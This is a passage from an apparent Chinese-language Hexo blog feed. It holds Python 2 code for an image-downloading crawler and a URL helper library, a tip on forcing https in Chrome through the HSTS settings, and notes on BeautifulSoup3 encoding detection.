class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># imagecatcher.py</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> clock</span><br><span class="line"><span class="hljs-keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> imagelistera <span class="hljs-keyword">import</span> ImageListerA</span><br><span class="line"><span class="hljs-keyword">from</span> ulib <span class="hljs-keyword">import</span> uopen, uclose, formatSize</span><br><span class="line"></span><br><span class="line">IMAGE_URL_FILE = <span class="hljs-string">"image_urls.txt"</span></span><br><span class="line">IMAGE_INFO_FILE = <span class="hljs-string">"image_info.txt"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImageCatcher</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, save_path, image_lister)</span>:</span></span><br><span class="line">        self.image_lister = image_lister</span><br><span class="line">        self.save_path = save_path</span><br><span class="line"></span><br><span class="line">        self.first_page = image_lister.getFirstPage()</span><br><span class="line">        self.title = image_lister.getTitle()</span><br><span class="line">        self.info = image_lister.getInfo()</span><br><span class="line">        self.dirname = os.path.join(save_path, self.title);</span><br><span class="line">        </span><br><span class="line">        self.__createDir(self.dirname, verbose=<span class="hljs-keyword">False</span>)</span><br><span class="line">        <span class="hljs-comment">#print self.first_page</span></span><br><span class="line">        <span class="hljs-keyword">print</span> self.title</span><br><span class="line">        <span class="hljs-comment">#print self.info</span></span><br><span class="line">        <span class="hljs-comment">#print self.dirname</span></span><br><span class="line">        self.downAllImages()</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="hljs-comment"># 创建图片文件夹</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__createDir</span><span class="hljs-params">(self, dirname, verbose=True)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dirname):</span><br><span class="line">            os.makedirs(dirname)</span><br><span class="line">            <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">u"已创建：%s"</span> % dirname</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">u"已存在：%s"</span> % dirname</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># 下载所有图片</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">downAllImages</span><span class="hljs-params">(self, verbose=True)</span>:</span></span><br><span class="line">        filename = os.path.join(self.dirname, IMAGE_URL_FILE)</span><br><span class="line">        <span class="hljs-comment"># 通过文件静态获取</span></span><br><span class="line">        <span class="hljs-keyword">if</span> os.path.exists(filename):</span><br><span class="line">            <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">u"已存在：%s"</span> % filename</span><br><span class="line">            images = self.__readImageUrls(filename, verbose)</span><br><span class="line">        <span class="hljs-comment"># 远程读取 url，并保存至文件</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            images = self.__saveImageUrls(filename, verbose)</span><br><span class="line">        self.images = images</span><br><span class="line"></span><br><span class="line">        imageNum = len(images)</span><br><span class="line">        i = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">for</span> image <span class="hljs-keyword">in</span> images:</span><br><span class="line">            i += <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">"%d/%d"</span> % (i, imageNum)</span><br><span class="line">                <span class="hljs-keyword">print</span> image</span><br><span class="line">            self.__saveImage(image)</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment"># 保存信息文件</span></span><br><span class="line">        filename = os.path.join(self.dirname, IMAGE_INFO_FILE)</span><br><span class="line">        self.__saveInfo(filename, verbose)</span><br><span class="line">        </span><br><span class="line">    <span class="hljs-comment"># 通过文件静态获取图片 URL</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__readImageUrls</span><span class="hljs-params">(self, filename, verbose=True)</span>:</span></span><br><span class="line">        f = open(filename, <span class="hljs-string">"r"</span>)</span><br><span class="line">        images = []</span><br><span class="line">        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:</span><br><span class="line">            images.append(line.rstrip(<span class="hljs-string">"\n"</span>))</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"搜索到：%d 张"</span> % len(images)</span><br><span class="line">        <span class="hljs-keyword">return</span> images</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># 远程读取图片 URL，并保存至文件</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__saveImageUrls</span><span class="hljs-params">(self, filename, verbose=True)</span>:</span></span><br><span class="line">        images = self.image_lister.getImages()</span><br><span class="line">        <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"搜索到：%d 张"</span> % len(images)</span><br><span class="line">        f = open(filename, <span class="hljs-string">"w"</span>)</span><br><span class="line">        <span class="hljs-keyword">for</span> image <span class="hljs-keyword">in</span> images:</span><br><span class="line">            f.write(image)</span><br><span class="line">            f.write(<span class="hljs-string">"\n"</span>)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"已写入：%s"</span> % filename</span><br><span class="line">        <span class="hljs-keyword">return</span> images</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__saveImage</span><span class="hljs-params">(self, url, verbose=True)</span>:</span></span><br><span class="line">        basename = url.split(<span class="hljs-string">"/"</span>)[<span class="hljs-number">-1</span>]</span><br><span class="line">        dirname = self.dirname</span><br><span class="line">        <span class="hljs-keyword">assert</span>(os.path.exists(dirname))</span><br><span class="line">        filename = os.path.join(dirname, basename)</span><br><span class="line"></span><br><span class="line">        file_size = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">if</span> os.path.exists(filename):</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"文件已存在：%s"</span> % filename</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            u = uopen(url)</span><br><span class="line">            <span class="hljs-keyword">if</span> u <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:</span><br><span class="line">                <span class="hljs-keyword">return</span></span><br><span class="line">            block_size = <span class="hljs-number">8192</span></span><br><span class="line">            downloaded_size = <span class="hljs-number">0</span></span><br><span class="line">            length = u.info().getheaders(<span class="hljs-string">"Content-Length"</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> length:</span><br><span class="line">                file_size = int(length[<span class="hljs-number">0</span>])</span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">u"文件大小：%s"</span> % formatSize(file_size)</span><br><span class="line"></span><br><span class="line">            f = open(filename, <span class="hljs-string">"wb"</span>)</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"正在下载：%s"</span> % url</span><br><span class="line">            start = clock()</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">                    buffer = u.read(block_size) </span><br><span class="line">                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> buffer:  <span class="hljs-comment"># EOF</span></span><br><span class="line">                        <span class="hljs-keyword">break</span></span><br><span class="line">                    downloaded_size += len(buffer);</span><br><span class="line">                    f.write(buffer)</span><br><span class="line"></span><br><span class="line">                    <span class="hljs-comment"># 显示下载进度</span></span><br><span class="line">                    <span class="hljs-keyword">if</span> file_size:</span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">"%2.1f%%\r"</span> % (float(downloaded_size * <span class="hljs-number">100</span>) / file_size),</span><br><span class="line">                    <span class="hljs-keyword">else</span>:</span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">'...'</span></span><br><span class="line">            <span class="hljs-keyword">except</span> BaseException, e:</span><br><span class="line">                <span class="hljs-keyword">print</span> e</span><br><span class="line">                f.close()</span><br><span class="line">                <span class="hljs-keyword">if</span> os.path.exists(filename):</span><br><span class="line">                    os.remove(filename)</span><br><span class="line">                    <span class="hljs-keyword">print</span> <span class="hljs-string">u"已删除损坏的文件：%s"</span>, filename</span><br><span class="line">                exit()</span><br><span class="line">            <span class="hljs-keyword">finally</span>:</span><br><span class="line">                uclose(u)</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"文件已保存：%s"</span> % os.path.abspath(filename)</span><br><span class="line">            end = clock()</span><br><span class="line">            spend = end - start</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"耗时：%.2f 秒"</span> % spend</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"平均速度：%.2fKB/s"</span> % (float(file_size) / <span class="hljs-number">1024</span> / spend)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="hljs-comment"># 保存信息文件</span></span><br><span class="line">    <span class="hljs-comment"># 文件包括：url, title, info</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__saveInfo</span><span class="hljs-params">(self, filename, verbose=True)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(filename):</span><br><span class="line">            info = self.image_lister.getInfo()</span><br><span class="line">            f = open(filename, <span class="hljs-string">"w"</span>)</span><br><span class="line">            f.write(self.first_page)</span><br><span class="line">            f.write(<span class="hljs-string">"\n"</span>)</span><br><span class="line">            <span class="hljs-comment"># 注意此处以将 Unicode 转换为 UTF-8 保存</span></span><br><span class="line">            <span class="hljs-keyword">if</span> self.title:</span><br><span class="line">                f.write(self.title.encode(<span class="hljs-string">"utf-8"</span>))</span><br><span class="line">                f.write(<span class="hljs-string">"\n"</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> self.info:</span><br><span class="line">                f.write(self.info.encode(<span class="hljs-string">"utf-8"</span>))</span><br><span class="line">                f.write(<span class="hljs-string">"\n"</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">u"已写入：%s"</span> % filename</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">u"已存在：%s"</span> % filename</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span></span><br><span class="line">        </span><br><span class="line"><span class="hljs-comment"># 单元测试 only</span></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    lister = ImageListerA(<span class="hljs-string">"http://*************************************.htm"</span>)</span><br><span class="line">    <span class="hljs-comment">#lister = ImageListerB("http://*************************************.htm")</span></span><br><span class="line">    ImageCatcher(<span class="hljs-string">"pics"</span>, lister)    <span class="hljs-comment"># "pics" 为相对路径</span></span><br></pre></td></tr></table></figure><h2 id="三、ulib-库"><a href="#三、ulib-库" class="headerlink" title="三、ulib 库"></a>三、ulib 库</h2><p>ulib 是我自己实现 URL 处理库（多谢 <a href="http://my.oschina.net/u/1254424" target="_blank" rel="noopener">ouats</a> 的提醒），代码实现如下：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> urllib2</span><br><span class="line"><span class="hljs-keyword">from</span> urllib2 <span class="hljs-keyword">import</span> Request, urlopen, HTTPError, URLError</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line"><span class="hljs-keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">RETRY_TIMES = <span class="hljs-number">5</span></span><br><span class="line">SLEEP_TIME = <span class="hljs-number">10</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uopen</span><span class="hljs-params">(url, headers=&#123;&#125;, timeout=None, verbose=True)</span>:</span></span><br><span class="line">    retryTimes = RETRY_TIMES</span><br><span class="line">    sleepTime = SLEEP_TIME</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> headers:</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            r = Request(url, headers=headers)</span><br><span class="line">            u = urlopen(r)</span><br><span class="line">        <span class="hljs-keyword">except</span> HTTPError, e:</span><br><span class="line">            <span class="hljs-keyword">print</span> e</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"服务器已禁止断点续传"</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> u</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">while</span> retryTimes &gt; <span class="hljs-number">0</span>:</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            u = urlopen(url)</span><br><span class="line">            <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">u"正在连接："</span>, url</span><br><span class="line">            <span class="hljs-comment"># 连接成功</span></span><br><span class="line">            <span class="hljs-keyword">if</span> u.code == <span class="hljs-number">200</span>:</span><br><span class="line">                <span class="hljs-keyword">return</span> u</span><br><span class="line">            <span class="hljs-keyword">elif</span> u.code == <span class="hljs-number">201</span>:</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">except</span> HTTPError, e:</span><br><span class="line">            <span class="hljs-keyword">print</span> e</span><br><span class="line">            <span class="hljs-keyword">if</span> e.code == <span class="hljs-number">404</span>:</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">except</span> URLError, e:</span><br><span class="line">            <span class="hljs-keyword">print</span> e</span><br><span class="line">        <span class="hljs-keyword">except</span> socket.timeout, e:</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"连接超时，等待重试……"</span></span><br><span class="line">        <span class="hljs-keyword">except</span> KeyboardInterrupt, e:</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"用户强制中止"</span></span><br><span class="line">            exit()</span><br><span class="line">        <span class="hljs-keyword">except</span> BaseException, e:</span><br><span class="line">            <span class="hljs-keyword">print</span> e</span><br><span class="line">        retryTimes -= <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-comment">#if verbose:</span></span><br><span class="line">        <span class="hljs-comment">#    print u"读取失败，等待重试……"</span></span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            <span class="hljs-comment"># 少量多次，见机中止</span></span><br><span class="line">            <span class="hljs-keyword">while</span> sleepTime &gt; <span class="hljs-number">0</span>:</span><br><span class="line">                sleep(<span class="hljs-number">1</span>)</span><br><span class="line">                sleepTime -= <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">except</span> KeyboardInterrupt, e:</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"用户强制中止"</span></span><br><span class="line">    <span class="hljs-keyword">if</span> retryTimes == <span class="hljs-number">0</span>:</span><br><span class="line">        exit()</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uread</span><span class="hljs-params">(u)</span>:</span></span><br><span class="line">    data = u.read()</span><br><span class="line">    <span class="hljs-keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uclose</span><span class="hljs-params">(u)</span>:</span></span><br><span class="line">    u.close()</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 格式化文件大小</span></span><br><span class="line"><span class="hljs-comment"># 如 10 =&gt; "10B", 1024 =&gt; "1.00KB"...</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">formatSize</span><span class="hljs-params">(size)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">if</span> size &gt; pow(<span class="hljs-number">1024</span>, <span class="hljs-number">2</span>):</span><br><span class="line">        new_size = size / pow(<span class="hljs-number">1024</span>, <span class="hljs-number">2</span>)</span><br><span class="line">        postfix = <span class="hljs-string">"MB"</span></span><br><span class="line">    <span class="hljs-keyword">elif</span> size &gt; <span class="hljs-number">1024</span>:</span><br><span class="line">        new_size = size / <span class="hljs-number">1024</span></span><br><span class="line">        postfix = <span class="hljs-string">"KB"</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        new_size = size</span><br><span class="line">        postfix = <span class="hljs-string">"B"</span></span><br><span class="line">    strsize = <span class="hljs-string">"%.2f"</span> % new_size</span><br><span class="line">    <span class="hljs-keyword">return</span> strsize + postfix</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    <span class="hljs-comment"># 单元测试</span></span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br></pre></td></tr></table></figure><p>注：在编写过程中，我一如既往地遇到了令人绝望的编码问题。我开发平台用的是 Windows 7，Python 2.7，折腾了好久，最后终于得到一个比较完美解决乱码问题的方法，即：</p><ol><li><p>在程序中无论何时都使用 unicode 处理字符串，因为 BeautifulSoup3 默认返回 unicode，我们要做的只是给自己的字符串前加一个 ‘u’，然后尽情地使用 unicode 吧。</p></li><li><p>可以直接将 unicode 输出到 IDLE 或 cmd.exe，系统会自动转换为 gbk 输出（前提是你系统的代码页是 cp936 或 gbk）。</p></li><li><p>保存文本文件时，将 unicode 转换为 utf-8 存入，读取时，将 utf-8 转换为 unicode。</p></li><li><p>至于 linux 下，我还没有试过，改天测试一下。</p></li></ol><p>（未完待续）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome 浏览器强制使用 https 传输</title>
      <link href="/hexo-blog/20130329/Chrome-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8-https-%E4%BC%A0%E8%BE%93/"/>
      <url>/hexo-blog/20130329/Chrome-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8-https-%E4%BC%A0%E8%BE%93/</url>
      
        <content type="html"><![CDATA[<p>在日常工作和生活中，一些网站的访问很容易受到“不可抗拒因素”的影响，这大多都是因为 http 请求是明文传输，这样很容易受到某些防火墙的干扰，比如“101 CONNECT_RESET”。而 Chrome 强制使用 https 协议访问这些站点一般来说可以解决此问题，设置方法如下：</p><a id="more"></a><p>在 Chrome 地址栏输入 chrome://net-internals/#hsts ，如图，在 Domain（域名）中输入地址，如 google.com 或 facebook.com，选中 Include subdomains（包含子域名），点击 Add（添加）。</p><img src="/hexo-blog/20130329/Chrome-浏览器强制使用-https-传输/193105_VZ7R_730461.png"><p>再访问这些站点，就会发现强制使用 https 了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeautifulSoup3 编码问题总结</title>
      <link href="/hexo-blog/20130328/BeautifulSoup3-%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/hexo-blog/20130328/BeautifulSoup3-%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>关于 BeautifulSoup3 对 <code>gb2312</code> 编码的网页解析的乱码问题，【<a href="http://leeon.me/a/beautifulsoup-chinese-page-resolve" target="_blank" rel="noopener">这篇文章</a>】提出了一个勉强能用的解决方法。即如果中文页面编码是 <code>gb2312</code>，<code>gbk</code>，在 BeautifulSoup 构造器中传入 <code>fromEncoding=&quot;gb18030&quot;</code> 参数即可解决乱码问题，即使分析的页面是 <code>utf8</code> 的页面使用 <code>gb18030</code> 也不会出现乱码问题！如：</p><a id="more"></a><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> urllib2 <span class="hljs-keyword">import</span> urlopen</span><br><span class="line"><span class="hljs-keyword">from</span> BeautifulSoup <span class="hljs-keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">page = urllib2.urlopen(<span class="hljs-string">'http://www.baidu.com'</span>);</span><br><span class="line">soup = BeautifulSoup(page,fromEncoding=<span class="hljs-string">"gb18030"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">print</span> soup.originalEncoding</span><br></pre></td></tr></table></figure><p>为什么网页是 <code>utf8</code> 传入 <code>gb18030</code> 依然能够正常解析呢？</p><p>这是由于，BeautifulSoup 的编码检测顺序为：</p><ol><li>创建 Soup 对象时传递的 <code>fromEncoding</code> 参数；</li><li>XML/HTML 文件自己定义的编码；</li><li>文件开始几个字节所表示的编码特征，此时能判断的编码只可能是以下编码之一：UTF-#，EBCDIC 和 ASCII；</li><li>如果你安装了 <code>chardet</code>，BeautifulSoup 就会用 <code>chardet</code> 检测文件编码；</li><li>UTF-8；</li><li>Windows-1252。</li></ol><p>因此，当传入 <code>fromEncoding=&quot;gb18030&quot;</code> 编码参数与 html 文件编码不匹配时，BeautifulSoup 并不会抛出异常，而是按照预定义的编码检测顺序，按照 utf8 来解析，因此也可以勉强得到正确结果！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找出字符串中第一个只出现一次的字符</title>
      <link href="/hexo-blog/20121019/%E6%89%BE%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E5%AD%97%E7%AC%A6/"/>
      <url>/hexo-blog/20121019/%E6%89%BE%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E5%AD%97%E7%AC%A6/</url>
      
